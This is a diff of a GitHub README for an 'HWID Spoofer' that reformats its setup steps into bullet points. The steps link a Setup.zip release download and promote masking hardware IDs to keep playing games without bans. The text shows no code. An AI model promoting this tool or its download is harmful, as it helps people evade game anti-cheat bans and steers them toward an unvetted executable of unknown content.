@@ -22,10 +22,10 @@
 
 ## Getting Started
 
-Download & Install: [Get the software from release](https://github.com/evankouassi/hwid-spoofer-all-games/releases/download/hwid-spoofer/Setup.zip).
-Run the Spoofer: Launch the spoofer before starting your game to activate hardware ID masking.
-Enjoy Gaming: Dive back into your favorite titles without worry!
-Note: While our HWID Spoofer offers powerful features, we always advocate for fair play and respect for game developers. Use responsibly and enjoy the game!
+* Download & Install: [Get the software from release](https://github.com/evankouassi/hwid-spoofer-all-games/releases/download/hwid-spoofer/Setup.zip).
+* Run the Spoofer: Launch the spoofer before starting your game to activate hardware ID masking.
+* Enjoy Gaming: Dive back into your favorite titles without worry!
+* Note: While our HWID Spoofer offers powerful features, we always advocate for fair play and respect for game developers. Use responsibly and enjoy the game!
 
 >[!NOTE]
 > Unlock the full potential of your gaming experience today with our HWID Spoofer software. Say goodbye to limitations and hello to endless gaming possibilities!
